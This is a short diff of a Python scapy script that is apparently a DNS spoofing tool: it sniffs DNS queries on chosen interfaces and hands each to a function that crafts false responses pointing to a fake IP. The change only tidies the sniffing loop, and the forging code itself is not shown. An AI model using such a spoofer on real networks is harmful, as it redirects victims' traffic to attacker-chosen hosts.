@@ -1,4 +1,3 @@
-from threading import Thread
 from scapy.all import *
 from scapy.layers.dns import DNSRR, DNS, DNSQR
 from scapy.layers.inet import IP, UDP
@@ -12,12 +11,11 @@ def stop_sniff(pkt):
 
 def sniffer(fakeip, interfaces):
     try:
-        pkt = sniff(prn=lambda pkt: craft_false_response(pkt, fakeip, interfaces),
-                    lfilter=lambda pkt: pkt.haslayer(DNSQR),
-                    iface=interfaces,
-                    stop_filter=stop_sniff)
-    except IndexError as err:
-        print(err)
+        sniff(prn=lambda pkt: craft_false_response(pkt, fakeip, interfaces),
+              lfilter=lambda pkt: pkt.haslayer(DNSQR),
+              iface=interfaces,
+              stop_filter=stop_sniff)
+    except IndexError:
         sniffer(fakeip, interfaces)
 
 
